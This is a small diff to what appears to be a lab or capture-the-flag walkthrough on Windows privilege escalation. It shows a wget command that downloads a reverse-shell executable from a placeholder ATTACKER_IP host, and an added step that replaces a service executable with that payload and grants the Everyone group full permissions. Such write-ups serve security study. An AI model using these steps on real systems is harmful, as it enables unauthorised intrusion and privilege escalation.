@@ -581,7 +581,8 @@ The easiest way to gain access to another user is to gather credentials from a c
     ```
     wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
     ```  
-    
+    Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:  
+    <img src="https://user-images.githubusercontent.com/73976100/224520014-770e05e2-b4f0-42b7-a9a0-886cedff698e.png" width="600">
 
 
 
